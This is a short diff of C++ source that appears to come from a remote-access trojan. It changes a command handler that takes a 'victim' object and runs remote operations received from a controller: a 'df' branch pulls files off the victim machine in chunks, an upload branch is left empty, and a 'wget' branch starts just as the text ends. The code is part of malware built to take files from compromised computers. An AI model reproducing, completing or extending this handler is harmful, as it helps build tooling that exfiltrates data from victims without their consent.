@@ -248,20 +248,15 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
             else if (vsMsg[1] == "df") //Download file.
             {
                 std::string szFilePath = vsMsg[2];
-                size_t nChunk = atoi(vsMsg[3].data());
+                size_t nIdx = atoi(vsMsg[3].data());
+                size_t nChunk = atoi(vsMsg[4].data());
 
-                std::thread thDownload(
-                    [&fileMgr, &victim, &szFilePath, nChunk]() 
-                    {
-                        fileMgr.fnDownloadFile(victim, szFilePath, nChunk);
-                    }
-                );
-
-                thDownload.join();
+                fileMgr->fnDownloadFile(victim, szFilePath, nIdx, nChunk);
+            
             }
             else if (vsMsg[1] == "uf") //Upload file.
             {
-
+                
             }
             else if (vsMsg[1] == "wget") //WGET.
             {
